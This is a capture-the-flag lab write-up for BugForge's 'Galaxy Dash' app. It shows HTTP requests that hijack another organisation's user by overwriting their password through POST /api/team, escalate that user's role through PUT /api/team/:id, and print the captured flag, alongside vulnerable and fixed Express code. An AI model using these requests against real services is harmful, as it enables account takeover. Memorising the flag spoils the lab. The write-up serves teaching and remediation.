---
layout: default
title: "Galaxy Dash (Cross-Org User Hijacking) - BugForge"
---

[← Back](./)

# BugForge - Galaxy Dash Lab Writeup

<div class="meta">
  <span><strong>Date:</strong> 2026-03-28</span>
  <span><strong>Difficulty:</strong> Medium</span>
  <span><strong>Platform:</strong> BugForge</span>
</div>

---

## Executive Summary

**Overall Risk Rating:** 🔴 Critical

**Key Findings:**
1. Cross-org user hijacking via `POST /api/team` — full account takeover by specifying any existing username (CVSS 9.8)
2. Broken object-level authorization on `PUT /api/team/:id` — permission updates bypass org boundaries (CVSS 8.1)

**Business Impact:** Any authenticated user can take over any other user account across organizational boundaries, including credential overwrite, enabling complete compromise of multi-tenant data isolation.

---

## Objective

Compromise target user `walt` on a Futurama-themed intergalactic B2B delivery platform (Galaxy Dash). The flag is returned in the login response when authenticating as walt.

## Initial Access
```bash
# Target Application
URL: https://lab-1774738563184-bgoz3k.labs-app.bugforge.io

# Auth — self-registered org_admin
Username: haxor
Organization ID: 4 (attacker-controlled)
```

## Key Findings

### Critical & High-Risk Vulnerabilities

1. **Cross-Org User Hijacking via Team Management** (CWE-284: Improper Access Control, CWE-639: Authorization Bypass Through User-Controlled Key) — `POST /api/team` accepts any existing username and overwrites their email/password, pulling them into the attacker's organization
2. **Broken Access Control on Team Permission Updates** (CWE-639: Authorization Bypass Through User-Controlled Key) — `PUT /api/team/:id` uses numeric user IDs with no organization scoping

**CVSS v3.1 Score for Cross-Org User Hijacking:** **9.8 (Critical)**

| Metric | Value |
|--------|-------|
| Attack Vector | Network |
| Attack Complexity | Low |
| Privileges Required | Low |
| User Interaction | None |
| Scope | Changed |
| Confidentiality | High |
| Integrity | High |
| Availability | High |

## Enumeration Summary

### Application Analysis

**Tech Stack:** Express (Node.js) backend, React SPA frontend, JWT HS256 auth (no expiry), SQLite, `Access-Control-Allow-Origin: *`

**Target Endpoints Discovered:**

| Method | Endpoint | Notes |
|--------|----------|-------|
| POST | /api/register | Create org + admin user |
| POST | /api/login | Login, returns JWT + user + flag (if walt) |
| GET | /api/verify-token | Validate JWT |
| GET/PUT | /api/organization | Org settings |
| GET/POST | /api/team | List/add team members |
| PUT | /api/team/:id | Update role/permissions (numeric ID) |
| DELETE | /api/team/:username | Remove member |
| GET/POST | /api/bookings | List/create bookings |
| GET | /api/invoices/:id | Invoice for booking |

## Attack Chain Visualization
```
┌──────────────┐     POST /api/register      ┌─────────────────┐
│   Attacker   │────────────────────────────▶│  New Org (id:4) │
│              │     org_admin JWT           │  user: haxor    │
└──────┬───────┘                             └─────────────────┘
       │
       │  POST /api/team
       │  {"username":"walt", "password":"attacker_pw", ...}
       ▼
┌──────────────────────────────────────────────────────────┐
│  Server: finds existing user walt (id:2)                 │
│  → Overwrites walt's email + password                    │
│  → Moves walt into org 4 (attacker's org)                │
│  → Returns: {"id":2,"message":"Team member added..."}    │
└──────────────────────────────────┬───────────────────────┘
                                   │
       ┌───────────────────────────┘
       │  POST /api/login
       │  {"username":"walt", "password":"attacker_pw"}
       ▼
┌──────────────────────────────────────────────────────────┐
│  Server returns walt's JWT + flag                        │
│  bug{Vg4SgLP3wGGIjluwl5OwQwdUhQ0KkqUx}                  │
└──────────────────────────────────────────────────────────┘
```

**Attack Path Summary:**
1. Register a new organization, receive org_admin JWT
2. POST /api/team with target username `walt` — server overwrites walt's credentials and pulls him into attacker's org
3. Login as walt with attacker-chosen password — flag returned in response
4. (Bonus) PUT /api/team/2 to escalate walt to org_admin — no org boundary check

---

## Exploitation Path

### Step 1: Reconnaissance — Mapping the API Surface

Registered a new organization and mapped all API endpoints via the React SPA's network traffic. Key observations:

- JWT payload contains `organizationId` used for server-side scoping
- Team management endpoints operate on usernames (add/delete) and numeric IDs (permission update)
- No token expiry — JWTs valid indefinitely
- Roles: `org_admin` (full access), `viewer` (read-only)
- Granular permissions: `can_view_deliveries`, `can_create_deliveries`, `can_edit_deliveries`, `can_manage_team`, `can_manage_org`

### Step 2: Cross-Org User Hijacking via POST /api/team

The team member creation endpoint accepts a username, email, password, role, and permissions. The critical flaw: it does not check whether the username already exists in another organization.

**Request:**
```http
POST /api/team HTTP/2
Host: lab-1774738563184-bgoz3k.labs-app.bugforge.io
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
Content-Type: application/json

{
  "username": "walt",
  "email": "pwned@attacker.com",
  "password": "attacker_pw",
  "full_name": "",
  "role": "viewer",
  "permissions": {
    "can_view_deliveries": true,
    "can_create_deliveries": false,
    "can_edit_deliveries": false,
    "can_manage_team": false,
    "can_manage_org": false
  }
}
```

**Response:**
```json
{"id": 2, "message": "Team member added successfully"}
```

Three boundaries broken in a single request:
1. **Cross-org access** — attacker's JWT (org 4) targeting user in org 1
2. **Credential overwrite** — existing user's password and email replaced
3. **No ownership validation** — server finds user by username globally, not scoped to org

### Step 3: Login as Hijacked User

With walt's credentials now set to attacker-controlled values:

```http
POST /api/login HTTP/2
Host: lab-1774738563184-bgoz3k.labs-app.bugforge.io
Content-Type: application/json

{
  "username": "walt",
  "password": "attacker_pw"
}
```

The response included walt's JWT and the flag in the response body.

### Step 4: Permission Escalation (Bonus)

After hijacking walt, escalated his role to `org_admin` using the numeric ID returned in Step 2:

```http
PUT /api/team/2 HTTP/2
Host: lab-1774738563184-bgoz3k.labs-app.bugforge.io
Authorization: Bearer <haxor_jwt>
Content-Type: application/json

{
  "role": "org_admin",
  "permissions": {
    "can_view_deliveries": true,
    "can_create_deliveries": true,
    "can_edit_deliveries": true,
    "can_manage_team": true,
    "can_manage_org": true
  }
}
```

This succeeded — the endpoint uses numeric user IDs with no org boundary check.

---

## Flag / Objective Achieved

✅ **Flag captured:** `bug{Vg4SgLP3wGGIjluwl5OwQwdUhQ0KkqUx}`

Returned in `POST /api/login` response body after authenticating as hijacked user `walt`.

---

## Key Learnings

- **Team management endpoints are high-value targets** — they often operate on usernames or IDs that may reference users across organizational boundaries
- **"Add member" flows that accept usernames are dangerous** — if the server resolves the username globally instead of within the calling org's scope, cross-org access is trivial
- **Credential overwrite on existing users is catastrophic** — the endpoint should reject the request if the user already exists, not silently update their credentials
- **Sequential numeric IDs without org scoping** — `PUT /api/team/:id` using user ID 2 worked regardless of the caller's org, indicating object-level authorization is missing
- **No JWT expiry** combined with account takeover means persistence — stolen sessions remain valid indefinitely

---

## Tools Used

- **Caido** - HTTP proxy for intercepting and replaying requests
- **Firefox** - Browser interaction with React SPA
- **curl** - Request reproduction and evidence capture

---

## Remediation

### 1. Cross-Org User Hijacking (CVSS: 9.8 - Critical)

**Issue:** `POST /api/team` resolves usernames globally and overwrites credentials on existing users, enabling full account takeover across organization boundaries.

**CWE References:** CWE-284 - Improper Access Control, CWE-639 - Authorization Bypass Through User-Controlled Key

**Fix:**
```javascript
// BEFORE (Vulnerable)
app.post('/api/team', async (req, res) => {
  const { username, email, password, role, permissions } = req.body;
  const existingUser = await db.get('SELECT * FROM users WHERE username = ?', username);
  if (existingUser) {
    // BUG: Updates existing user's credentials and org membership
    await db.run('UPDATE users SET email = ?, password = ?, organization_id = ? WHERE username = ?',
      email, hashedPassword, req.user.organizationId, username);
    return res.json({ id: existingUser.id, message: 'Team member added successfully' });
  }
  // ... create new user
});

// AFTER (Secure)
app.post('/api/team', async (req, res) => {
  const { username, email, password, role, permissions } = req.body;
  const existingUser = await db.get('SELECT * FROM users WHERE username = ?', username);
  if (existingUser) {
    // Reject if user exists — never overwrite credentials
    return res.status(409).json({ error: 'Username already taken' });
  }
  // Create new user scoped to the caller's org
  const newUser = await db.run(
    'INSERT INTO users (username, email, password, organization_id, role) VALUES (?, ?, ?, ?, ?)',
    username, email, hashedPassword, req.user.organizationId, role
  );
  return res.status(201).json({ id: newUser.lastID, message: 'Team member created' });
});
```

### 2. Broken Object-Level Authorization on Permission Updates (CVSS: 8.1 - High)

**Issue:** `PUT /api/team/:id` accepts a numeric user ID with no validation that the target user belongs to the calling user's organization.

**CWE Reference:** CWE-639 - Authorization Bypass Through User-Controlled Key

**Fix:**
```javascript
// BEFORE (Vulnerable)
app.put('/api/team/:id', async (req, res) => {
  const { role, permissions } = req.body;
  await db.run('UPDATE users SET role = ? WHERE id = ?', role, req.params.id);
  // No org check — any user ID is accepted
});

// AFTER (Secure)
app.put('/api/team/:id', async (req, res) => {
  const { role, permissions } = req.body;
  const targetUser = await db.get(
    'SELECT * FROM users WHERE id = ? AND organization_id = ?',
    req.params.id, req.user.organizationId
  );
  if (!targetUser) {
    return res.status(404).json({ error: 'User not found in your organization' });
  }
  await db.run('UPDATE users SET role = ? WHERE id = ?', role, req.params.id);
});
```

### Additional Recommendations

- **Add JWT expiry** — current tokens have no `exp` claim, allowing indefinite session persistence
- **Restrict CORS** — `Access-Control-Allow-Origin: *` allows any origin to make authenticated requests
- **Use UUIDs instead of sequential IDs** — reduces enumeration risk on team, booking, and invoice endpoints
- **Audit unconfirmed vectors** — IDOR on bookings/invoices and client-side price trust are likely vulnerable given the pattern

---

## Failed Attempts

### Approach 1: N/A
```
First hypothesis (cross-org user hijacking via team management) was the correct vector.
```
**Result:** No dead ends encountered — first vector tested was the winner.

---

## OWASP Top 10 Coverage

- **A01:2021** - Broken Access Control (cross-org user hijacking, missing org boundary validation, object-level authorization bypass)
- **A07:2021** - Identification and Authentication Failures (credential overwrite on existing users, JWTs with no expiry)
- **A05:2021** - Security Misconfiguration (permissive CORS: `Access-Control-Allow-Origin: *`)

---

## References

**Broken Access Control Resources:**
- [OWASP Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [CWE-284: Improper Access Control](https://cwe.mitre.org/data/definitions/284.html)
- [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html)
- [OWASP API Security — BOLA](https://owasp.org/API-Security/editions/2023/en/0xa1-broken-object-level-authorization/)

---

**Tags:** `#broken-access-control` `#IDOR` `#account-takeover` `#cross-org` `#JWT` `#BugForge` `#webapp`
